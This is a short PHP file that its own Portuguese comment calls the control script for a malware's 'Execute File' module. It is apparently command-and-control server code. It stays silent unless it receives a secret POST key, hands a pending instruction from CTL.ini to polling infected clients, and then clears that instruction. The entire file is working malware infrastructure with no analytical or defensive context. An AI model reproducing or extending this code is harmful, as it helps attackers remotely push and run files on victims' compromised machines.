<?php
//
// 8748940939845.php ~~ ExecFile.php
//  Arquivo de controle do módulo de Execute File do Malware.
//

	error_reporting(0);
	if (isset($_POST["829492"])) {
		
		$CTLINI = parse_ini_file("CTL.ini", "CTL");
		$CTLIDX = $CTLINI["CTL"]["FLX"];
		
		$lenX = strlen($CTLIDX);
		if ($lenX > 1) {
			echo $CTLIDX;
			
			$buf = "[CTL]\nFLX=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		} else {
			echo "0";
	
			$buf = "[CTL]\nFLX=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		}
	}

// EOF
?>
